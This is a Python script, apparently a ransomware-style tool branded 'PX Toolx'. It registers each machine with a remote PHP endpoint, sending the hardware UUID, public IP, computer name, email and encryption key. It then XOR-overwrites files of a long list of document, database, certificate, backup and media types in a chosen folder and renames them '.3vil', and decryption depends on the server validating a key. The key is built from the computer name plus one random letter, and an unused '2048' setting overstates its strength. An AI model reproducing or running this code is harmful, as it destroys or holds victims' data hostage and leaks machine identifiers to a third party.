import time
import hashlib
import secrets
import string
import sys
from threading import Thread
from queue import Queue
import os
from requests import get as rget, post as post
import subprocess
from tkinter import filedialog
from tkinter import *


def pauseClass(message):
    input(message)


def welcome():
    lines = ["",
    " _______   __    __        ________                      __           ",
    "|       \ |  \  |  \      |        \                    |  \          ",
    "| $$$$$$$\| $$  | $$       \$$$$$$$$  ______    ______  | $$ __    __ ",
    "| $$__/ $$ \$$\/  $$         | $$    /      \  /      \ | $$|  \  /  \\",
    "| $$    $$  >$$  $$          | $$   |  $$$$$$\|  $$$$$$\| $$ \$$\/  $$",
    "| $$$$$$$  /  $$$$\          | $$   | $$  | $$| $$  | $$| $$  >$$  $$ ",
    "| $$      |  $$ \$$\         | $$   | $$__/ $$| $$__/ $$| $$ /  $$$$\ ",
    "| $$      | $$  | $$         | $$    \$$    $$ \$$    $$| $$|  $$ \$$\\",
    " \$$       \$$   \$$          \$$     \$$$$$$   \$$$$$$  \$$ \$$   \$$",
    "                                                                      ",
    "                                             Helping you take control.",
    "                                                 www.pxtoolx.com      ",
    ""]
    for x in lines:
        print(x)
        time.sleep(0.1)


def error():
    list = ["  ",
    " ",
    "                          ______                      ",
    "  _________        .---\"""      \"""---.               ",
    " :______.-':      :  .--------------.  :              ",
    " | ______  |      | :                : |              ",
    " |:______B:|      | |  Little Error: | |              ",
    " |:______B:|      | |                | |              ",
    " |:______B:|      | |  Contact       | |              ",
    " |         |      | |  Support.      | |              ",
    " |:_____:  |      | |                | |              ",
    " |    ==   |      | :                : |              ",
    " |       O |      :  '--------------'  :              ",
    " |       o |      :'---...______...---'               ",
    " |       o |-._.-i___/'             \._               ",
    " |'-.____o_|   '-.   '-...______...-'  `-._           ",
    " :_________:      `.____________________   `-.___.-.  ",
    "                  .'.eeeeeeeeeeeeeeeeee.'.      :___: ",
    "     fsc        .'.eeeeeeeeeeeeeeeeeeeeee.'.          ",
    "               :____________________________: ",
    "  ",
    " "]

    for x in list:
        print(x)
        time.sleep(0.1)


def byebye():
    welcome()
    art = [" BYE BYE! ",
           " ",
           "  ",
           "   , ; ,   .-'\"\"\"'-.    , ; , ",
           "   \\\\|/  .'         '.  \|// ",
           "    \-;-/   ()   ()   \-;-/ ",
           "    // ;               ; \\\\ ",
           "   //__; :.         .; ;__\\\\ ",
           "  `-----\\'.'-.....-'.'/-----' ",
           "         '.'.-.-,_.'.' ",
           "           '(  (..-' ",
           "             '-' ",
           "  ",
           " "]
    for x in art:
        print(x)
        time.sleep(0.1)


def done(status):
    os.system("cls")
    print(f"PC {pcname} {status}.")
    msgs = ['DDDDDDDDDDDDD             OOOOOOOOO     NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEE',
            'D::::::::::::DDD        OO:::::::::OO   N:::::::N       N::::::NE::::::::::::::::::::E',
            'D:::::::::::::::DD    OO:::::::::::::OO N::::::::N      N::::::NE::::::::::::::::::::E',
            'DDD:::::DDDDD:::::D  O:::::::OOO:::::::ON:::::::::N     N::::::NEE::::::EEEEEEEEE::::E',
            '  D:::::D    D:::::D O::::::O   O::::::ON::::::::::N    N::::::N  E:::::E       EEEEEE',
            '  D:::::D     D:::::DO:::::O     O:::::ON:::::::::::N   N::::::N  E:::::E',
            '  D:::::D     D:::::DO:::::O     O:::::ON:::::::N::::N  N::::::N  E::::::EEEEEEEEEE',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N N::::N N::::::N  E:::::::::::::::E',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N  N::::N:::::::N  E:::::::::::::::E',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N   N:::::::::::N  E::::::EEEEEEEEEE',
            '  D:::::D     D:::::DO:::::O     O:::::ON::::::N    N::::::::::N  E:::::E',
            '  D:::::D    D:::::D O::::::O   O::::::ON::::::N     N:::::::::N  E:::::E       EEEEEE',
            'DDD:::::DDDDD:::::D  O:::::::OOO:::::::ON::::::N      N::::::::NEE::::::EEEEEEEE:::::E',
            'D:::::::::::::::DD    OO:::::::::::::OO N::::::N       N:::::::NE::::::::::::::::::::E',
            'D::::::::::::DDD        OO:::::::::OO   N::::::N        N::::::NE::::::::::::::::::::E',
            'DDDDDDDDDDDDD             OOOOOOOOO     NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE',
            '']

    for msg in msgs:
        print(msg)
        time.sleep(0.15)


def keyboardinterrupt():
    os.system("cls")
    cont = input(f"are you sure you want to abort operation?\n:>> ")
    if str(cont).lower() in ["y", "yes"]:
        print("Okay.. stopping operation as requested")
        sys.exit(5)
    else:
        print("Okay, process continues..")
        pass


# def keyboardinterrupt(func):
#     def wrapper(*args, **kwargs):
#         try:
#             return func(*args, **kwargs)
#         except KeyboardInterrupt:
#             exc_data()
#             # Execute some function here or perform some other action
#     return wrapper


encrypted_ext = ('.json',
                 '.shtml',
                 '.mmp',
                 '.dibs',
                 '.dib',
                 '.smr',
                 '.smp',
                 '.der',
                 '.pfx',
                 '.key',
                 '.crt',
                 '.csr',
                 '.p12',
                 '.pem',
                 '.odt',
                 '.ott',
                 '.sxw',
                 '.stw',
                 '.uot',
                 '.3ds',
                 '.max',
                 '.3dm',
                 '.ods',
                 '.ots',
                 '.sxc',
                 '.stc',
                 '.dif',
                 '.slk',
                 '.wb2',
                 '.odp',
                 '.otp',
                 '.sxd',
                 '.std',
                 '.uop',
                 '.odg',
                 '.otg',
                 '.sxm',
                 '.mml',
                 '.lay',
                 '.lay6',
                 '.asc',
                 '.sqlite3',
                 '.sqlitedb',
                 '.sql',
                 '.accdb',
                 '.mdb',
                 '.db',
                 '.dbf',
                 '.odb',
                 '.frm',
                 '.myd',
                 '.myi',
                 '.ibd',
                 '.mdf',
                 '.ldf',
                 '.sln',
                 '.suo',
                 '.cs',
                 '.c',
                 '.cpp',
                 '.pas',
                 '.h',
                 '.asm',
                 '.js',
                 '.cmd',
                 '.bat',
                 '.ps1',
                 '.vbs',
                 '.vb',
                 '.pl',
                 '.dip',
                 '.dch',
                 '.sch',
                 '.brd',
                 '.jsp',
                 '.php',
                 '.asp',
                 '.rb',
                 '.java',
                 '.jar',
                 '.class',
                 '.sh',
                 '.mp3',
                 '.wav',
                 '.swf',
                 '.fla',
                 '.wmv',
                 '.mpg',
                 '.vob',
                 '.mpeg',
                 '.asf',
                 '.avi',
                 '.mov',
                 '.mp4',
                 '.3gp',
                 '.mkv',
                 '.3g2',
                 '.flv',
                 '.wma',
                 '.mid',
                 '.m3u',
                 '.m4u',
                 '.djvu',
                 '.svg',
                 '.ai',
                 '.psd',
                 '.nef',
                 '.tiff',
                 '.tif',
                 '.cgm',
                 '.raw',
                 '.gif',
                 '.png',
                 '.bmp',
                 '.jpg',
                 '.jpeg',
                 '.vcd',
                 '.iso',
                 '.backup',
                 '.zip',
                 '.rar',
                 '.7z',
                 '.gz',
                 '.tgz',
                 '.tar',
                 '.bak',
                 '.tbk',
                 '.bz2',
                 '.PAQ',
                 '.ARC',
                 '.aes',
                 '.gpg',
                 '.vmx',
                 '.vmdk',
                 '.vdi',
                 '.sldm',
                 '.sldx',
                 '.sti',
                 '.sxi',
                 '.602',
                 '.hwp',
                 '.snt',
                 '.onetoc2',
                 '.dwg',
                 '.pdf',
                 '.wk1',
                 '.wks',
                 '.123',
                 '.rtf',
                 '.csv',
                 '.txt',
                 '.vsdx',
                 '.vsd',
                 '.edb',
                 '.eml',
                 '.msg',
                 '.ost',
                 '.pst',
                 '.potm',
                 '.potx',
                 '.ppam',
                 '.ppsx',
                 '.ppsm',
                 '.pps',
                 '.pot',
                 '.pptm',
                 '.pptx',
                 '.ppt',
                 '.xltm',
                 '.xltx',
                 '.xlc',
                 '.xlm',
                 '.xlt',
                 '.xlw',
                 '.xlsb',
                 '.xlsm',
                 '.xlsx',
                 '.xls',
                 '.dotx',
                 '.dotm',
                 '.dot',
                 '.docm',
                 '.docb',
                 '.docx',
                 '.doc',
                 )


def check():
    response = post(url, data=data)
    if response.status_code == 200:
        try:
            response_data = response.json()
        except KeyboardInterrupt:
            keyboardinterrupt()
        except Exception as et:
            print(et)
            time.sleep(30)
            exit()
        else:
            if response_data['status'] == 'success':
                os.system("cls")
                welcome()
                for root, dir, files in os.walk(f'{sysUser}'):
                    for file in files:
                        file_path, file_ext = os.path.splitext(root + '\\' + file)
                        if file_ext.lower() in encrypted_ext:
                            file_paths.append(root + '\\' + file)
                            paths.add(root)
                            print(f"adding {root}/{file} to list")
            elif response_data['status'] == 'error' and response_data['msg'] == "already_exist":
                os.system("cls")
                error()
                print("Your PC encryption status is: Already Encrypted.\ncontact support if this is a false positive.")
                time.sleep(30)
                exit()
            elif response_data['status'] == 'error' and response_data['msg'] == "Invalid Key":
                error()
                print(f"decryption key: {key} is invalid.\ncontact support if this is a false positive.")
                check()
            else:
                error()
                print(f"Unrecognised error, contact support with Error note: '{response_data}'.")
                time.sleep(30)
                exit()
    else:
        error()
        print("Error confirming encryption status.\ncheck your internet service or contact support if problem persists")
        time.sleep(30)
        exit()


def encrypt(key, state):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = len(key) - 1
        try:
            with open(file, 'rb') as fp:
                data = fp.read()
            with open(file, 'wb') as fp:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    fp.write(xor_byte.to_bytes(1, 'little'))
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
                print(f'<< {file} {state} sucessfuly>>')
            if state == "Encrypted":
                os.rename(file, file + ".3vil")
            elif state == "Decrypted":
                os.rename(file, os.path.splitext(file)[0])
        except KeyboardInterrupt:
            keyboardinterrupt()
        except Exception as ep:
            print(f'Failed to encrypt {file}\n{ep}\n\nSkipping{file}')
            pass

        q.task_done()


if __name__ == '__main__':
    state = ""
    key = ""
    function_used = ""
    action = ""
    url = "https://extractor.pxtoolx.com/gosecure.php"
    encryption_level = 2048 // 8
    pcname = os.getenv('COMPUTERNAME')
    hostname = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
    # sysUser = f"{os.environ['USERPROFILE']}/Desktop/Pxtoolx/"
    sysRoot = {os.path.expanduser('~')}
    # owner = 'prixzlex@163.com'
    paths = set()
    file_paths = []
    q = Queue()
    try:
        action = int(
            input(f"Which action would you like to perform?\n1. Encrypt {pcname} files\n2. Decrypt {pcname} files\n:>> "))
        pauseClass("Press the <ENTER> key to select folder\n")
        Tk().withdraw()
        sysUser = filedialog.askdirectory()
        if action == 1:
            while True:
                owner = str(input("*IMPORTANT WARNING* Do not make a mistake on the email address as you might not have access to recover your files.\nEnter Valid Email Address :>> ")).lower()
                confirm_owner = str(input("Confirm Email Address :>> ")).lower()
                if confirm_owner == owner:
                    break
                else:
                    print("Email addresses do not match.")
                    continue
            state = "Encrypted"
            key3 = secrets.choice(string.ascii_letters)
            key2 = os.getenv('COMPUTERNAME') + key3
            key1 = key2.encode('utf-8')
            key = hashlib.sha256(key1).hexdigest()

            publicIP = rget('https://api.ipify.org').text
            data = {
                "hostname": hostname,
                "function_name": "encData",
                "ip": publicIP,
                "key": key,
                "owner": owner,
                "pcname": pcname,
            }
        if action == 2:
            state = "Decrypted"
            encrypted_ext = (".3vil",)
            key = str(input(f"TO DECRYPT YOUR FILES. \n{pcname}\nEnter key to decrypt your files :>> "))
            data = {
                "function_name": "decData",
                "hostname": hostname,
                "key": key,
            }
        check()
        for file in file_paths:
            q.put(file)
        os.system("cls")
        welcome()
        for i in range(20):
            thread = Thread(target=encrypt, args=(key, state,), daemon=True)
            thread.start()

        q.join()
    except KeyboardInterrupt:
        keyboardinterrupt()
    except Exception as ex:
        print(f"Error >>{ex}")
        sys.exit(30)
    if action == 1:
        done("Encryption")
    elif action == 2:
        done("Decryption")
    else:
        done("action")
    time.sleep(30)
